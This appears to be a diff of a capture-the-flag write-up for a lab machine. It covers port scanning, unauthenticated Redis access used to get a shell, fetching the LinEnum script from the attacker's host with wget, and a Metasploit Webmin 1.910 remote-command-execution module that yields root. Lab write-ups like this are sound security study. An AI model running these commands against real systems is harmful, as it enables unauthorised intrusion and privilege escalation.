@@ -6,6 +6,7 @@
 
 # Reconnaissance
 
+Run a Full Nmap Scan to find all the open ports & the services associated with them.
 
 ```
 nmap -sC -sV -p- -oA full-port-scan 10.10.10.160 -vvv
@@ -15,19 +16,21 @@ nmap -sC -sV -p- -oA full-port-scan 10.10.10.160 -vvv
   <img src="screenshots/2.png" width="738">
 </p>
 
-Port 80 contains a webpage. A directory brute-forcing on the page shows nothing interesting to work upon.
+Port 80 contains a webpage. A usual Directory brute-forcing on the page shows nothing interesting to work upon.
 
 <p align="center">
   <img src="screenshots/3.png" width="738">
 </p>
 
-Port 6379 is running a redis server. There is no authentication kept in place.
+Port 6379 is running a redis server. There is no authentication kept in place. 
+We can use a command line tool called ```redis-cli``` to interact with it.
+
 
 ```
 redis-cli -h 10.10.10.160 -p 6379
 ```
 
-This command can be used to get the current working directory of redis
+This command can be used to get the current working directory of redis.
 
 ```
 config get dir
@@ -42,7 +45,7 @@ The path to ssh is found: ```/var/lib/redis/.ssh```
 
 # Exploitation
 
-The redis server (version 4.0.9) is running on port 6379. <a href="https://github.com/Avinash-acid/Redis-Server-Exploit">Here</a> is a working exploit for the same.
+The redis server (Version 4.0.9) is running on port 6379. <a href="https://github.com/Avinash-acid/Redis-Server-Exploit">Here</a> is a working exploit for the same.
 
 A slight modification is needed in the exploit script to change the ```config set dir``` path:
 
@@ -83,7 +86,7 @@ Finally we get a shell as redis user on the box.
 Lets transfer Local Linux Enumeration & Privilege Escalation Checks script to the compromised machine via Python server.
 The script can be found <a href="https://github.com/rebootuser/LinEnum">here.</a>
 
-* Run Python Server on the Local Machine containing the script via this command:
+* Run Python Server on the Local Machine containing the script (in the same path) via this command:
 
 ```
 python -m SimpleHTTPServer 9090
@@ -104,7 +107,7 @@ wget http://10.10.15.196:9090/linenum.sh
   <img src="screenshots/11.png" width="738">
 </p>
 
-* Run the exploit script with thorough tests enabled:
+* Run the exploit script with thorough-tests enabled:
 
 ```
 chmod +x linenum.sh
@@ -165,13 +168,13 @@ The Port 10000 is also open and runs a Webmin interface (Version 1.910)
   <img src="screenshots/20.png" width="738">
 </p>
 
-The Username & Password found above serves as a valid login credentials to the Webmin server.
+The Username & Password found above serves as a valid Login Credentials to the Webmin server.
 
 <p align="center">
   <img src="screenshots/21.png" width="738">
 </p>
 
-The Webmin Version 1.910 contains 'Package Updates' Remote Command Execution (Metasploit) Vulnerability.
+The Webmin Version 1.910 contains 'Package Updates' Remote Command Execution Vulnerability. The Metasploit module for the same also exists.
 
 * Start the Metasploit using following command:
 
@@ -183,7 +186,7 @@ msfdb run
   <img src="screenshots/19.png" width="738">
 </p>
 
-* Type the following commands to configure the exploit:
+* Type the following commands to configure the exploit & then run it:
 
 ```
 use exploit/linux/http/webmin_packageup_rce
@@ -211,8 +214,3 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 
 Finally the root flag is retrieved.
-
-
-
-
-
